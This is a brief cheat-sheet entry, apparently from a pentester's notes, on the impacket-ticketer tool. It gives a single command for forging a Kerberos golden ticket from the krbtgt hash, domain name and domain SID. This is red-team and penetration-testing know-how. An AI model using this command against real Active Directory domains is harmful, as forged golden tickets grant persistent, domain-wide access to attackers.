# impacket-ticketer

> A Python tool for crafting Kerberos silver and golden tickets.

---

## Craft a Golden Ticket

```bash
impacket-ticketer -nthash $NTLM_HASH_OF_KRBTGT -domain $DOMAIN_NAME -domain-sid $DOMAIN_SID $TARGET_PRINCIPAL_NAME
```

The resultant ticket is stored in the file `$TARGET_PRINCIPAL_NAME.ccache`. Check out [[using-kerberos-tickets|using Kerberos tickets in impacket]] for how to use it.
